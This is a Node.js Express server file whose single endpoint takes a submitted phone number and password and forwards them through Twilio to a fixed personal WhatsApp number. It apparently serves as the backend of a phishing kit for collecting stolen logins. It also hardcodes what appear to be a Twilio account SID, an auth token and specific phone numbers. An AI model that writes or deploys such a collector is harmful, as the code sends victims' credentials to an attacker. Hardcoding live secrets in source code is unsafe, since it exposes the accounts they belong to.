// server.js
const express = require('express');
const bodyParser = require('body-parser');
const twilio = require('twilio');

const app = express();
const port = process.env.PORT || 3000;

// Your Twilio credentials
const accountSid = 'AC8bf73d87d26c5daa32c4d838c6b7c749'; // Replace with your Twilio Account SID
const authToken = '87832adda550da1e8d732d707583b1e0'; // Replace with your Twilio Auth Token
const twilioClient = twilio(accountSid, authToken);

app.use(bodyParser.json());

// Endpoint to send WhatsApp messages
app.post('/send-to-whatsapp', async (req, res) => {
    const { phone, password } = req.body;

    // Validate input
    if (!phone || !password) {
        return res.status(400).send('Phone number and password are required.');
    }

    // Construct the message
    const message = `Phone: ${phone}, Password: ${password}`;

    try {
        // Send message via WhatsApp
        const response = await twilioClient.messages.create({
            from: 'whatsapp:+19095004709', // Your Twilio WhatsApp number
            to: 'whatsapp:+27612982927',    // Your WhatsApp number
            body: message,
        });
        console.log('Message sent:', response.sid);
        res.sendStatus(200); // Send success response
    } catch (error) {
        console.error('Error sending message:', error.message);
        res.status(500).send('Error sending message.'); // Send error response
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
